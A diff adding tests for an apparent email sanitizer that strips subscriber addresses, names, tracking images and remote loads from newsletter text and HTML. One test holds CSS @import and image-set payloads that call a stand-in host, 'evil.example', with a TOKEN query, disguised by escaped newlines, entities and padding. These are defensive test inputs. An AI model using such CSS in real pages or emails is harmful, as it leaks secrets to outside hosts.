@@ -570,6 +570,172 @@ describe('cleanEmail', () => {
   })
 })
 
+describe('what the third review found', () => {
+  const sample = {
+    addresses: ['capture@inbox.example', 'samriv@gmail.com'],
+    names: []
+  }
+
+  it('removes every address shape, hidden or not', () => {
+    for (const text of [
+      'sampleinbox%25252540gmail.com',
+      'john.doe@[10.0.0.1]',
+      '"john doe"@example.com',
+      'john!doe@example.com',
+      'help [@] northwind.example',
+      'john\u{34f}@doe.example',
+      'sampleinbox+north.wind',
+      'sampleinbox.Thanks',
+      'sampleinbox_shop'
+    ])
+      expect(cleanEmailText(`Write to ${text} today`, me), text).not.toMatch(
+        /sampleinbox|john|doe|help|%/
+      )
+    // A short local part goes next to its own domain, however spaced.
+    for (const text of [
+      'capture at inbox.example',
+      'capture [@] inbox.example',
+      'capture @ inbox . example',
+      'capture &#64; inbox.example',
+      'samriv at gmail',
+      'samriv [at] gmail',
+      'samriv   @   gmail.com',
+      'samriv&#64;gmail.com'
+    ])
+      expect(cleanEmailText(`Write to ${text} today`, sample), text).toBe(
+        'Write to today'
+      )
+  })
+
+  it('removes a name hidden by invisible or styled characters', () => {
+    for (const text of [
+      'Thanks, Sa\u{34f}m!',
+      'Thanks, Sa\u{fe0f}m!',
+      'Thanks, Sa\u{e0020}m!',
+      'Thanks, Sa\u{1d173}m!',
+      'Thanks, \u{1d412}\u{1d41a}\u{1d426}!'
+    ])
+      expect(cleanEmailText(text, me), text).toBe('Thanks!')
+    expect(cleanEmailText('Hi \u{1d412}\u{1d41a}\u{1d426},', me)).toBe(
+      'Hi there,'
+    )
+    const irish = { addresses: [], names: ["O'Brien"] }
+    expect(cleanEmailText('Thanks, O\u{2019}Brien!', irish)).toBe('Thanks!')
+  })
+
+  it('removes names in scripts written without spaces', () => {
+    expect(
+      cleanEmailText(
+        '\u{5c71}\u{7530}\u{592a}\u{90ce}\u{69d8}\u{3001}\u{3053}\u{3093}\u{306b}\u{3061}\u{306f}',
+        {
+          addresses: [],
+          names: ['\u{5c71}\u{7530}\u{592a}\u{90ce}']
+        }
+      )
+    ).toBe('\u{69d8}\u{3001}\u{3053}\u{3093}\u{306b}\u{3061}\u{306f}')
+    expect(
+      cleanEmailText(
+        '\u{ae40}\u{bbfc}\u{c218}\u{b2d8}, \u{c548}\u{b155}\u{d558}\u{c138}\u{c694}',
+        {
+          addresses: [],
+          names: ['\u{ae40}\u{bbfc}\u{c218}']
+        }
+      )
+    ).toBe('\u{b2d8}, \u{c548}\u{b155}\u{d558}\u{c138}\u{c694}')
+  })
+
+  it('keeps delivery promises that only say "you"', () => {
+    for (const text of [
+      'Delivered to you in two days.',
+      'Delivered to you in 2\u{2013}3 working days.',
+      'Sent to you the next morning.',
+      'Delivered to you every Friday'
+    ])
+      expect(cleanEmailText(text, me)).toBe(text)
+  })
+
+  it('refuses text that does not settle', () => {
+    expect(
+      cleanEmailText('Write sa(sa(sa(sa(sam)m)m)m)mpleinbox now', me)
+    ).toBe('')
+  })
+
+  it('shows only real raster data images and plain srcset sizes', () => {
+    expect(
+      body(
+        cleanEmailHtml(
+          '<img src="data:image/png,hello sampleinbox@gmail.com Sam Rivera"><img src="data:image/png;name=sampleinbox@gmail.com;base64,AAAA"><video poster="data:image/gif,Sam Rivera"></video><img srcset="data:image/png;base64,AAAA 1x sampleinbox@gmail.com"><img srcset="img/aa.png 1x Sam Rivera, img/aa.png 2x">',
+          me,
+          { images }
+        )
+      )
+    ).toBe(
+      '<img src=""><img src=""><video poster=""></video><img srcset=""><img srcset="img/aa.png 2x">'
+    )
+  })
+
+  it('never shows a personalised picture, not even its stored copy', () => {
+    const nifty =
+      'https://img.nifty.example/hello.png?name=Sam&email=sampleinbox%40gmail.com'
+    expect(
+      body(
+        cleanEmailHtml(`<img src="${nifty.replace('&', '&amp;')}">`, me, {
+          images: [{ ref: nifty, path: 'img/cc.png' }]
+        })
+      )
+    ).toBe('<img src="">')
+    // Escapes are read, also twice applied, for a short local part too.
+    const twice = 'https://x.example/a.png?e=capture%2540inbox.example'
+    expect(
+      body(
+        cleanEmailHtml(`<img src="${twice}">`, sample, {
+          images: [{ ref: twice, path: 'img/dd.png' }]
+        })
+      )
+    ).toBe('<img src="">')
+  })
+
+  it('lets no CSS load a file, whatever it hides behind', () => {
+    for (const css of [
+      '<style>@import "https://evil.example/x.css?k=TOKEN\\\n";</style>',
+      '<style>@import "\\\nhttps://evil.example/x.css";</style>',
+      `<div style="background:image-set('https://evil.example/a.png?k=TOKEN\\\n' 1x)">x</div>`,
+      '<div style="background:image-set(&quot;https://evil.example/a.png?k=TOKEN\\&#10;&quot; 1x)">x</div>',
+      `<style>@import "${'x'.repeat(2_100)}https://evil.example/?k=TOKEN";</style>`,
+      '<style>@import url(https://evil.example/x.css);</style>',
+      '<style>@import "https://evil.example/x.css"</style>'
+    ])
+      expect(cleanEmailHtml(css, me), css.slice(0, 60)).not.toMatch(
+        /evil|TOKEN/
+      )
+    // Ordinary CSS stays as written.
+    const plain =
+      '<style>@media (width < 600px){.sm\\:hidden{display:none}}a{content:"\\\\\\\\"}</style>'
+    expect(cleanEmailHtml(plain, me)).toContain(plain)
+  })
+
+  it('never takes a name out of CSS words or HTML tag names', () => {
+    const persona = {
+      addresses: [],
+      names: ['Max Georgia', 'Li', 'Em', 'Mark', 'Line', 'Min']
+    }
+    const html =
+      '<p style="max-width:600px;line-height:1.5;min-height:1px;font-family:Georgia,serif"><em>Linen</em></p><ul><li>One</li></ul><mark>New</mark>'
+    expect(body(cleanEmailHtml(html, persona))).toBe(html)
+  })
+
+  it('joins the words of boxes set to display inline', () => {
+    expect(
+      body(
+        cleanEmailHtml(
+          '<p style="display:inline">Sa</p><p style="display:inline">m</p>',
+          me
+        )
+      )
+    ).toBe('<p style="display:inline"></p><p style="display:inline"></p>')
+  })
+})
+
 describe('inboxIdentity', () => {
   it('is the inbox address and the subscriber names from the settings', () => {
     expect(
